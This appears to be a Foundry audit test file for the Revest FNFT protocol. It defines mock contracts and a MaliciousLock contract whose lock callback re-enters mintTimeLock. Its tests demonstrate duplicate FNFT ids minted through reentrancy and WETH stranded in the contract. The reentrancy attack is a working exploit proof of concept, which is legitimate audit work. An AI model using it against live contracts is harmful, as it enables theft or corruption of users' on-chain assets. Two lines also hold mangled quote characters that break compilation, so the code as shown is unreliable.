contract MockERC20 is IERC20 {
    string public name = 'M'; string public symbol = 'M'; uint8 public decimals = 18;
    mapping(address=>uint) public override balanceOf;
    mapping(address=>mapping(address=>uint)) public override allowance;
    function totalSupply() external pure override returns(uint){return 0;}
    function transfer(address to, uint amount) external override returns(bool){balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true;}
    function approve(address s, uint a) external override returns(bool){allowance[msg.sender][s]=a; return true;}
    function transferFrom(address f,address t,uint a) external override returns(bool){uint al=allowance[f][msg.sender]; require(al>=a,'allow'); allowance[f][msg.sender]=al-a; balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function mint(address to,uint a) external {balanceOf[to]+=a;}
}

contract MockWETH is MockERC20, IWETH {
    receive() external payable {}
    function deposit() external payable override { balanceOf[msg.sender] += msg.value; }
    function withdraw(uint wad) external override { balanceOf[msg.sender]-=wad; payable(msg.sender).transfer(wad); }
}

contract MockRegistry is IAddressRegistry {
    address public admin; address public lock; address public tv; address public revest; address public fnft; address public meta; address public rew; address public dex; address public token; address public lps;
    function initialize(address,address,address,address,address,address,address,address,address) external override {}
    function getAdmin() external view override returns(address){return admin;}
    function setAdmin(address a) external override {admin=a;}
    function getLockManager() external view override returns(address){return lock;}
    function setLockManager(address a) external override {lock=a;}
    function getTokenVault() external view override returns(address){return tv;}
    function setTokenVault(address a) external override {tv=a;}
    function getRevestFNFT() external view override returns(address){return fnft;}
    function setRevestFNFT(address a) external override {fnft=a;}
    function getMetadataHandler() external view override returns(address){return meta;}
    function setMetadataHandler(address a) external override {meta=a;}
    function getRevest() external view override returns(address){return revest;}
    function setRevest(address a) external override {revest=a;}
    function getDEX(uint) external view override returns(address){return dex;}
    function setDex(address a) external override {dex=a;}
    function getRevestToken() external view override returns(address){return token;}
    function setRevestToken(address a) external override {token=a;}
    function getRewardsHandler() external view override returns(address){return rew;}
    function setRewardsHandler(address a) external override {rew=a;}
    function getAddress(bytes32) external pure override returns(address){return address(0);}    
    function getLPs() external view override returns(address){return lps;}
    function setLPs(address a) external override {lps=a;}
}

contract MockVault is ITokenVault {
    mapping(uint=>IRevest.FNFTConfig) public cfg;
    function createFNFT(uint fnftId, IRevest.FNFTConfig memory fnftConfig, uint, address) external override { cfg[fnftId]=fnftConfig; }
    function withdrawToken(uint,uint,address) external override {}
    function depositToken(uint,uint,uint) external override {}
    function cloneFNFTConfig(IRevest.FNFTConfig memory old) external pure override returns (IRevest.FNFTConfig memory){ return old; }
    function mapFNFTToToken(uint, IRevest.FNFTConfig memory) external override {}
    function handleMultipleDeposits(uint,uint,uint) external override {}
    function splitFNFT(uint,uint[] memory,uint[] memory,uint) external override {}
    function getFNFT(uint fnftId) external view override returns (IRevest.FNFTConfig memory){ return cfg[fnftId]; }
    function getFNFTCurrentValue(uint) external pure override returns (uint){ return 0; }
    function getNontransferable(uint) external pure override returns (bool){ return false; }
    function getSplitsRemaining(uint) external pure override returns (uint){ return 1; }
}

contract MockLockManager is ILockManager {
    mapping(uint=>IRevest.LockType) public override lockTypes;
    mapping(uint=>uint) public override fnftIdToLockId;
    mapping(uint=>IRevest.Lock) public locks;
    uint public nextLock;
    function createLock(uint fnftId, IRevest.LockParam memory lock) external override returns(uint){
        uint id = ++nextLock; fnftIdToLockId[fnftId]=id; locks[id]=IRevest.Lock(lock.addressLock, lock.lockType, lock.valueLock, lock.timeLockExpiry, block.timestamp, false); lockTypes[fnftId]=lock.lockType; return id;
    }
    function getLock(uint lockId) external view override returns(IRevest.Lock memory){ return locks[lockId]; }
    function fnftIdToLock(uint fnftId) external view override returns(IRevest.Lock memory){ return locks[fnftIdToLockId[fnftId]]; }
    function pointFNFTToLock(uint fnftId,uint lockId) external override { fnftIdToLockId[fnftId]=lockId; lockTypes[fnftId]=locks[lockId].lockType; }
    function unlockFNFT(uint,address) external pure override returns(bool){ return true; }
    function getLockMaturity(uint) external pure override returns(bool){ return true; }
}

contract MockRewards is IRewardsHandler {
    function receiveFee(address token, uint amount) external override { IERC20(token).transferFrom(msg.sender, address(this), amount); }
    function updateLPShares(uint,uint) external override {}
    function updateBasicShares(uint,uint) external override {}
    function getAllocPoint(uint,address,bool) external pure override returns(uint){ return 0; }
    function claimRewards(uint,address) external pure override returns(uint){ return 0; }
    function setStakingContract(address) external override {}
    function getRewards(uint,address) external pure override returns(uint){ return 0; }
}

contract MockMetadata is IMetadataHandler {
    function getTokenURI(uint) external pure override returns (string memory){ return ''; }
    function setTokenURI(uint,string memory) external override {}
    function getRenderTokenURI(uint,address) external pure override returns(string memory,string[] memory p){ p = new string[](0); return ('', p); }
    function setRenderTokenURI(uint,string memory) external override {}
}

contract MaliciousLock is IAddressLock {
    Revest target; bool done; IRevest.FNFTConfig cfg; address[] rec; uint[] qty;
    constructor(Revest _target){ target = _target; }
    function arm(IRevest.FNFTConfig memory _cfg, address user) external {
        cfg = _cfg; rec = new address[](1); rec[0]=user; qty = new uint[](1); qty[0]=1;
    }
    function createLock(uint, uint, bytes memory) external override {
        if("'!done){ done=true; target.mintTimeLock(block.timestamp+1, rec, qty, cfg); }
    }
    function updateLock(uint,uint,bytes memory) external override {}
    function isUnlockable(uint,uint) external pure override returns(bool){ return true; }
    function getDisplayValues(uint,uint) external pure override returns(bytes memory){ return '"''; }
    function getMetadata() external pure override returns(string memory){ return ''; }
    function needsUpdate() external pure override returns(bool){ return false; }
    function supportsInterface(bytes4 interfaceId) external pure override returns(bool){ return interfaceId == type(IAddressLock).interfaceId; }
    function setAddressRegistry(address) external override {}
    function getAddressRegistry() external pure override returns(address){ return address(0); }
}

contract RevestAuditTest is Test {
    MockRegistry reg; Revest revest; FNFTHandler fnft; MockVault vault; MockLockManager lm; MockWETH weth; MockERC20 token; MockRewards rewards; MockMetadata meta; MaliciousLock lock;
    function setUp() public {
        reg = new MockRegistry(); weth = new MockWETH(); vault = new MockVault(); lm = new MockLockManager(); rewards = new MockRewards(); meta = new MockMetadata();
        revest = new Revest(address(reg), address(weth)); fnft = new FNFTHandler(address(reg)); token = new MockERC20(); lock = new MaliciousLock(revest);
        reg.setAdmin(address(this)); reg.setLockManager(address(lm)); reg.setTokenVault(address(vault)); reg.setRevest(address(revest)); reg.setRevestFNFT(address(fnft)); reg.setMetadataHandler(address(meta)); reg.setRewardsHandler(address(rewards)); reg.setRevestToken(address(0));
        token.mint(address(this), 1000 ether); token.approve(address(revest), type(uint).max); weth.mint(address(this), 1000 ether); weth.approve(address(revest), type(uint).max);
    }
    function _cfg(address asset) internal pure returns(IRevest.FNFTConfig memory c){ c.asset=asset; c.depositAmount=1 ether; c.isMulti=true; }
    function test_duplicateIdViaReentrancy() public {
        IRevest.FNFTConfig memory c = _cfg(address(token)); lock.arm(c, address(this));
        address[] memory rec = new address[](1); rec[0]=address(this); uint[] memory q = new uint[](1); q[0]=1;
        uint id = revest.mintAddressLock(address(lock), '', rec, q, c);
        assertEq(id, 0);
        assertEq(fnft.getSupply(0), 2, 'same id minted twice');
        assertEq(fnft.getNextId(), 2, 'counter advanced twice');
        assertEq(fnft.getSupply(1), 0, 'id 1 never minted');
    }
    function test_wethMsgValueStuck() public {
        IRevest.FNFTConfig memory c = _cfg(address(weth));
        address[] memory rec = new address[](1); rec[0]=address(this); uint[] memory q = new uint[](1); q[0]=1;
        revest.mintTimeLock{value: 1 ether}(block.timestamp+1, rec, q, c);
        assertEq(weth.balanceOf(address(vault)), 1 ether, 'vault got pulled WETH');
        assertEq(weth.balanceOf(address(revest)), 1 ether, 'msg.value WETH stranded in Revest');
    }
}
